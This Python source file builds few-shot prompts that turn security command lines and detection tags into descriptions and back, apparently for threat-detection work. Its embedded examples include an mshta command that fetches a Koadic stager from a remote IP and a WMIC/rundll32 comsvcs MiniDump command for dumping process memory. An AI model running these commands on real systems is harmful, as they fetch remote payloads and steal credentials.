import os
import time
import logging
import openai


openai.api_key = os.getenv("OPENAI_API_KEY")

logging.getLogger("openai").setLevel(logging.ERROR)
logging.basicConfig(format="%(asctime)s %(message)s",
                        datefmt='%Y-%m-%d %H:%M:%S', level=logging.INFO)    
logger = logging.getLogger(__name__)


STR_PREFIX_CMD = '## Command\n'
STR_PREFIX_TAGS = '## Tags\n'

STR_PREFIX_DESC = '## Description\nThe command'
STR_PREFIX_ABOVE_DESC = '## Description\nThe above command'
STR_PREFIX_BELOW_DESC = '## Description\nThe below command'

STR_PREFIX_FIRST_DESC = '## Description1\nThe command'
STR_PREFIX_SECOND_DESC = '## Description2\nThe command'
STR_PREFIX_COMBINED_DESC = 'The Description1 and Description2 describe the Command, combine them and complete the Description.\n'


PREFIX_CMD2DESC_DESC2CMD_TAG_2EXAMPLES = '''###
## Command
\"cmd.exe\" \/c mshta.exe http:\/\/10.254.0.94:80\/133540\/koadic1 & timeout 5 & tasklist \/svc | findstr \/i mshta
## Tags
win_pc_suspicious_tasklist_command,win_suspicious_findstr
## Description
The above command will execute a suspicious mshta.exe instance on the specified URL and then timeout after 5 seconds. It will then list all services with \"mshta\" in their name using the \"tasklist \/svc\" command.
###
## Tags
win_process_dump_rundll32_comsvcs,win_susp_wmi_execution,win_susp_wmic_proc_create_rundll32
## Description
The below command will dump the process memory of \"rundll32.exe\" to \"C:\\windows\\temp\\scomcheck.tmp\". The \"MiniDump 572\" parameter will cause the dump to be written to a MiniDump file.
## Command
\"C:\\Windows\\System32\\Wbem\\WMIC.exe\" \/privileges:enable process call create \"rundll32.exe C:\\windows\\system32\\comsvcs.dll MiniDump 572 c:\\windows\\temp\\scomcheck.tmp full\"
###
'''


PREFIX_CMD2DESC_DESC2CMD_2EXAMPLES ='''###
## Command
\"cmd.exe\" \/c mshta.exe http:\/\/10.254.0.94:80\/133540\/koadic1 & timeout 5 & tasklist \/svc | findstr \/i mshta
## Description
The above command will execute a suspicious mshta.exe instance on the specified URL and then timeout after 5 seconds. It will then list all services with \"mshta\" in their name using the \"tasklist \/svc\" command.
## Description
The below command will dump the process memory of \"rundll32.exe\" to \"C:\\windows\\temp\\scomcheck.tmp\". The \"MiniDump 572\" parameter will cause the dump to be written to a MiniDump file.
## Command
\"C:\\Windows\\System32\\Wbem\\WMIC.exe\" \/privileges:enable process call create \"rundll32.exe C:\\windows\\system32\\comsvcs.dll MiniDump 572 c:\\windows\\temp\\scomcheck.tmp full\"
###
'''


def preprocess_cmd_data(cmd, max_cmd_len):
    """
    replaces "\n" with "" and reduces the data length.
    :param cmd: command line data
    :param max_cmd_len: the max data length
    """
    return cmd.replace("\n", " ")[:max_cmd_len]


def preprocess_tags_str(tags):
    """
    replaces susp with suspicious otherwise, it can be miss-interpretted as suspended
    :param tags: tags 
    """
    if tags:
        tags = tags.replace("_susp_", "_suspicious_")
    return tags


def get_prompt_for_desc_from_cmd_tag(
    cmd, 
    tags, 
    max_cmd_len=200, 
    include_tag=True, 
    include_prefix=False
):
    """
    return a prompt as
## Command
cmd.exe
## Tags
win_tags
## Description
the above command
    """
    cmd = preprocess_cmd_data(cmd, max_cmd_len)

    if include_tag:
        prefix = PREFIX_CMD2DESC_DESC2CMD_TAG_2EXAMPLES
        prompt = STR_PREFIX_CMD + cmd + "\n" + STR_PREFIX_TAGS + tags +  "\n" + STR_PREFIX_ABOVE_DESC
    else:
        prefix = PREFIX_CMD2DESC_DESC2CMD_2EXAMPLES
        prompt = STR_PREFIX_CMD + cmd + "\n" + STR_PREFIX_ABOVE_DESC

    if include_prefix:
        prompt = prefix + prompt
    return prompt


def get_prompt_for_cmd_from_tag_desc(
    tags, 
    desc, 
    cmd, 
    max_cmd_len=200,
    include_tag=True, 
    include_prefix=False
):
    """
    returns a prompt as
## Tags
win_tags
## Description
the below command will ...
## Command
cmd.exe
    """
    cmd = preprocess_cmd_data(cmd, max_cmd_len)

    if include_tag:
        prefix = PREFIX_CMD2DESC_DESC2CMD_TAG_2EXAMPLES
        prompt = STR_PREFIX_TAGS + tags + "\n" + STR_PREFIX_BELOW_DESC + desc + "\n" + STR_PREFIX_CMD + cmd
    else:
        prefix = PREFIX_CMD2DESC_DESC2CMD_2EXAMPLES
        prompt = STR_PREFIX_BELOW_DESC + desc + "\n" + STR_PREFIX_CMD + cmd

    if include_prefix:
        prompt = prefix + prompt
    return prompt


def get_prompt_for_combined_desc(
    cmd, 
    desc1, 
    desc2, 
    max_cmd_len=200
):
    """
    return a prompt as
STR_PREFIX_COMBINED_DESC
## Command
...
## Description1
The command 
## Description2
The command
## Description
The command
    """
    cmd = preprocess_cmd_data(cmd, max_cmd_len)

    prompt = STR_PREFIX_COMBINED_DESC + STR_PREFIX_CMD + cmd + "\n" + STR_PREFIX_FIRST_DESC + desc1 + "\n"
    prompt += STR_PREFIX_SECOND_DESC + desc2 + "\n" + STR_PREFIX_DESC
    return prompt


def run_openai_completion(
    prompt, 
    engine, 
    n,
    temperature=0.7,
    max_tokens=300, 
):
    """
    calls openai completion api.
    :param prompt: prompt data
    :param engine: openai engine
    :param n: number of outputs
    :param temperature: temperature to contral randomness, ranging between 0.0 and 1.0
    :param max_tokens: max output token size
    """
    #to remove multi-line python code text add "\n"
    return openai.Completion.create(
        prompt=prompt,         
        engine=engine, 
        n=n, 
        temperature=temperature, 
        max_tokens=max_tokens, 
        stop=["##", "\n"] 
    )


def generate_text_list_with_prompt(
    prompt, 
    engine="code-davinci-002", 
    n=5,
    temperature=0.7, 
    sleep_time=30
):
    """
    generates a list of text with the prompt.
    :param prompt: prompt data
    :param engine: openai engine
    :param n: number of outputs
    :param temperature: temperature to contral randomness, ranging between 0.0 and 1.0
    :param max_tokens: max output token size
    :param sleep_time: sleep time in seconds
    """
    text_list = []
    while True:
        #if there are temp errors, then sleep and retry
        try:
            logging.debug("prompt:{}".format(prompt))
            res = run_openai_completion(
                prompt, engine=engine, n=n, temperature=temperature)
            logging.debug("res:{}".format(res))
            text_list = [item['text'] for item in res['choices']]
            break
        except openai.error.RateLimitError as ex:
            logging.error("RateLimitError, ex:{}".format(ex))
            time.sleep(sleep_time)
        except openai.error.APIConnectionError as ex:
            logging.error("APIConnectionError, ex:{}".format(ex))
            time.sleep(sleep_time)
    return text_list
